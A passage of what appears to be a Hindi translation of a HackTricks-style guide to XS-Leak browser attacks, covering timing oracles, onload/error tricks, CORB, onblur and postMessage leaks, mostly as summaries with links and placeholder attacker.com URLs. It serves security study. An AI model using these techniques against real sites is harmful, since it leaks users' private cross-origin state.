* **рд╕рд╛рд░рд╛рдВрд╢:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ рдЙрд╕реЗ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рд▓ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) рдЬреЛ 50 рдорд┐рд▓реАрд╕реЗрдХрдВрдб рд╕реЗ рдЕрдзрд┐рдХ рдЪрд▓ рд░рд╣реЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload рдЯрд╛рдЗрдорд┐рдВрдЧ + рдордЬрдмреВрд░ рднрд╛рд░реА рдХрд╛рд░реНрдп

рдпрд╣ рддрдХрдиреАрдХ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рд╕реЗ рдмрд┐рд▓реНрдХреБрд▓ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди **рд╣рдорд▓рд╛рд╡рд░** рднреА **рдЬрдмрд╛рдм рд╕рдХрд╛рд░рд╛рддреНрдордХ рдпрд╛ рдирдХрд╛рд░рд╛рддреНрдордХ рд╣реЛрддрд╛ рд╣реИ** рддреЛ рдХреБрдЫ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ **рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдорд╛рддреНрд░рд╛ рд╕рдордп** рд▓реЗрдиреЗ рдХреЗ рд▓рд┐рдП рднреА **рдордЬрдмреВрд░** рдХрд░реЗрдЧрд╛ рдФрд░ рдЙрд╕ рд╕рдордп рдХреЛ рдорд╛рдкреЗрдЧрд╛ред

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload рдЯрд╛рдЗрдорд┐рдВрдЧ

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рдХрд╛рд░рдг)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **рд╕рд╛рд░рд╛рдВрд╢:** [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ рдЙрд╕реЗ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рд▓ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

рдХрд┐рд╕реА рд╕рдВрд╕рд╛рдзрди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╕рдордп [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) рдФрд░ [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) рдШрдЯрдирд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред **`beforeunload`** рдШрдЯрдирд╛ рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХ рдирдП рдкреГрд╖реНрда рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛрддрд╛ рд╣реИ, рддрдм рдлрд╛рдпрд░ рд╣реЛрддреА рд╣реИ, рдЬрдмрдХрд┐ **`unload`** рдШрдЯрдирд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрд╢рди рд╣реЛ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИред рдЗрди рджреЛ рдШрдЯрдирд╛рдУрдВ рдХреЗ рдмреАрдЪ рдХрд╛ рд╕рдордп рдирд┐рдХрд╛рд▓рдХрд░ **рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдиреЗ рд╕рдВрд╕рд╛рдзрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рдмрд┐рддрд╛рдпрд╛**ред

### Sandboxed Frame рдЯрд╛рдЗрдорд┐рдВрдЧ + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╕рдордп (рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА, рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рдХрд╛рд░рдг)
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **рд╕рд╛рд░рд╛рдВрд╢:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рддрдирд╛ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИ рдЙрд╕реЗ рдорд╛рдкрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЕрдиреНрдп рдШрдбрд╝рд┐рдпрд╛рд▓ рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

рдпрд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ [рдлреНрд░реЗрдорд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛](https://xsleaks.dev/docs/defenses/opt-in/xfo/) рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдПрдХ рдкреГрд╖реНрда рдФрд░ рдЙрд╕рдХреЗ рдЙрдкрд╕рд╛рдзрди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕рдордп рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдорд╛рдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдорд╛рдкрди рд╕рд╛рдорд╛рдиреНрдпрдд: рдЗрд╕рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдЖрдЗрдлреНрд░реЗрдо рдХрд╛ `onload` рд╣реИрдВрдбрд▓рд░ рд╕рдВрд╕рд╛рдзрди рд▓реЛрдбрд┐рдВрдЧ рдФрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдкреВрд░реНрдг рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рд╣реА рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╡реЗрд╢рд┐рдд рдЕрд╕реНрдерд┐рд░рддрд╛ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП `<iframe>` рдХреЗ рднреАрддрд░ред рдЗрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рд╕рдорд╛рд╡реЗрд╢ рдХрдИ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖рдХрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ, рдЗрд╕рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рджрд░реНрд╢рди рджреНрд╡рд╛рд░рд╛ рдкреНрд░рднрд╛рд╡рд┐рдд рдорд╛рдкрди рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рддрд╛ рд╣реИред
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + рддреНрд░реБрдЯрд┐ + onload

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**:
* **рд╕рд╛рд░рд╛рдВрд╢**: рдпрджрд┐ рдЖрдк рдкреГрд╖реНрда рдореЗрдВ рддреНрд░реБрдЯрд┐ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рд╕рд╣реА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╕рдордп рдХреЛ рдорд╛рдкрдиреЗ рдХреЗ рдмрд┐рдирд╛ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓реВрдк рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

рдорд╛рди рд▓реЗрдВ рдХрд┐ рдЖрдк **рдПрдХ рдЖрдЗрдлреНрд░реЗрдо** рдореЗрдВ **рдЧреБрдкреНрдд рд╕рд╛рдордЧреНрд░реА рд╡рд╛рд▓рд╛ рдкреГрд╖реНрда** **рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЖрдк **рдкреАрдбрд╝рд┐рдд рдХреЛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** "_**рдзреНрд╡рдЬ**_" рд╢рдмреНрдж рд╕рдорд╛рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдЖрдЗрдлреНрд░реЗрдо** рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП CSRF рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреЗ рд╣реБрдП)ред рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рдЕрдВрджрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ _**onload рдШрдЯрдирд╛**_ рдХреЛ **рдХрдо рд╕реЗ рдХрдо рдПрдХ рдмрд╛рд░ рд╣рдореЗрд╢рд╛ рд╕рдХреНрд░рд┐рдп** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдлрд┐рд░, рдЖрдк **рдпреВрдЖрд░рдПрд▓** рдХреЛ **рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ** рд▓реЗрдХрд┐рди рдХреЗрд╡рд▓ рдпреВрдЖрд░рдПрд▓ рдХреЗ рдЕрдВрджрд░ рд╣реИрд╢ рдХреА **рд╕рд╛рдордЧреНрд░реА** рдХреЛ **рдмрджрд▓рдХрд░**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

1. **рдпреВрдЖрд░рдПрд▓1**: www.attacker.com/xssearch#try1
2. **рдпреВрдЖрд░рдПрд▓2**: www.attacker.com/xssearch#try2

рдпрджрд┐ рдкрд╣рд▓реА рдпреВрдЖрд░рдПрд▓ **рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд▓реЛрдб рд╣реБрдИ**, рддреЛ, рдЬрдм рдпреВрдЖрд░рдПрд▓ рдХреЗ рд╣реИрд╢ рднрд╛рдЧ рдХреЛ **рдмрджрд▓рддреЗ рд╣реИрдВ**, рддреЛ **onload** рдШрдЯрдирд╛ **рдлрд┐рд░ рд╕реЗ рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реЛрдЧрд╛**ред рд▓реЗрдХрд┐рди рдпрджрд┐ рдкреГрд╖реНрда рдХреЛ рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдХреЛрдИ **рддреНрд░реБрдЯрд┐** рдереА, рддреЛ **onload** рдШрдЯрдирд╛ **рдлрд┐рд░ рд╕реЗ рд╕рдХреНрд░рд┐рдп рд╣реЛрдЧрд╛**ред

рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдк **рд╕рд╣реА рдврдВрдЧ рд╕реЗ** рд▓реЛрдб рд╣реБрдП рдкреГрд╖реНрда рдпрд╛ рдкреГрд╖реНрда рдХреЗ рдмреАрдЪ рдПрдХ **рддреНрд░реБрдЯрд┐** рд╡рд╛рд▓реЗ рдкреГрд╖реНрда рдХреЗ рдмреАрдЪ **рднрд┐рдиреНрдирддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрдм рддрдХ рдЙрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрди

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**:
* **рд╕рд╛рд░рд╛рдВрд╢:** рдпрджрд┐ **рдкреГрд╖реНрда** **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА** рд╡рд╛рдкрд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ, **рдпрд╛** рдПрдХ **рд╕рд╛рдордЧреНрд░реА** рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рд╡реИрдз JS рдХреЛрдб рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдирдХрд╛рд░рд╛рддреНрдордХ рдорд╛рдорд▓реЗ рдореЗрдВ**, рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдпрд╛рд╕ рдХреЛ **`<script>`** рдЯреИрдЧ рдХреЗ рдЕрдВрджрд░ **рд▓реЛрдб** рдХрд░реЗрдВ, рдЗрд╕рд▓рд┐рдП **рдирдХрд╛рд░рд╛рддреНрдордХ** рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ **рдХреЛрдб** **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ,** рдФрд░ **рд╕рдХрд╛рд░рд╛рддреНрдордХ** рдорд╛рдорд▓реЛрдВ рдореЗрдВ **рдХреБрдЫ рднреА** рдирд╣реАрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛**ред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдФрд░ рд╣реЗрдбрд░
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **рд╕рд╛рд░рд╛рдВрд╢**: **рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рд░реАрдб рдмреНрд▓реЙрдХрд┐рдВрдЧ (CORB)** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд╣реИ рдЬреЛ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреЛ рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рд╕реНрдкреЗрдХреНрдЯрд░** рдЬреИрд╕реЗ рд╣рдорд▓реЛрдВ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХ рд╡реНрдпрд╡рд╣рд╛рд░ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм **CORB** рдХреЗ рдЕрдзреАрди рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ _**CORB рд╕рдВрд░рдХреНрд╖рд┐рдд**_ `Content-Type` рдХреЗ рд╕рд╛рде `nosniff` рдФрд░ рдПрдХ `2xx` рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдХреЗ рд╕рд╛рде рд▓реМрдЯрд╛рддрд╛ рд╣реИ, **CORB** рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмреЙрдбреА рдФрд░ рд╣реЗрдбрд░ рдХреЛ рдЫреАрди рд▓реЗрддрд╛ рд╣реИред рдЗрд╕реЗ рдЕрд╡рд▓реЛрдХрди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣рдорд▓рд╛рд╡рд░ **рд╕реНрдерд┐рддрд┐ рдХреЛрдб** (рд╕рдлрд▓рддрд╛ рдпрд╛ рддреНрд░реБрдЯрд┐ рдХреА рд╕рдВрдХреЗрдд рджреЗрдирд╛) рдФрд░ `Content-Type` (рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ **CORB** рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реИ) рдХреЗ рд╕рдВрдпреЛрдЬрди рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рдВрднрд╛рд╡рд┐рдд рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХреЗрдЬ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**:

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред

### onblur

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **рд╕рд╛рд░рд╛рдВрд╢**: рдЖрдИрдбреА рдпрд╛ рдирд╛рдо рд╡рд┐рд╢реЗрд╖рддрд╛ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд▓реАрдХ рдХрд░реЗрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

рдПрдХ рдкреГрд╖реНрда рдХреЛ **рдПрдХ рдЖрдЗрдлреНрд░реЗрдо** рдореЗрдВ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдкреГрд╖реНрда рдХреЗ рддрддреНрд╡ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`#id_value`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдлрд┐рд░ рдпрджрд┐ **`onblur`** рд╕рд┐рдЧреНрдирд▓ рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдИрдбреА рддрддреНрд╡ рдореМрдЬреВрдж рд╣реИред\
рдЖрдк **`рдкреЛрд░реНрдЯрд▓`** рдЯреИрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рд╣реА рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдореНрд╕, рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рдЕрдВрддрд░**: API рдЙрдкрдпреЛрдЧ
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **рд╕рд╛рд░рд╛рдВрд╢**: postMessage рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░реЗрдВ рдпрд╛ postMessages рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдкрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдСрд░реЗрдХрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░реЗрдВ
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: `рдХрд┐рд╕реА рднреА рдХреЛрдб рдЬреЛ рд╕рднреА postMessages рдХреЗ рд▓рд┐рдП рд╕реБрди рд░рд╣рд╛ рд╣реИред`

рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдЕрдХреНрд╕рд░ рд╡рд┐рднрд┐рдиреНрди рдореВрд▓ рд╕реНрдерд╛рдиреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [`postMessage` рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ `targetOrigin` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╡рд┐рдзрд┐ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╡рд┐рдВрдбреЛ рдХреЛ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЗрд╡рд▓ 